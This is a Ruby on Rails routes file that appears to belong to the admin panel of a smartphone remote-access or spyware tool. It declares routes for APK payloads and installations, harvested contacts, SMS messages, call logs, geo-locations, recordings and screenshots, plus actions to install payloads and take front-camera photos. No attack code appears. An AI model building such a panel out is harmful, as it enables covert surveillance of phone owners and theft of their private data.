Rails.application.routes.draw do
  resources :smartphones
  resources :apk_installations
  resources :apk_payloads
  resources :contacts
  resources :geo_locations
  resources :sms_messages
  resources :call_logs
  resources :recordings
  resources :videos
  resources :screenshots
  resources :pictures do
    collection do
        post :take_picture
    end
end

  resources :smartphones do
    collection do
        get :load
        post :install 
        post :front_camera_snap
        post :select_smartphone
        post :take_picture
    end
  end
  
  devise_for :admin_users, ActiveAdmin::Devise.config
  ActiveAdmin.routes(self)
  # For details on the DSL available within this file, see https://guides.rubyonrails.org/routing.html
 

end

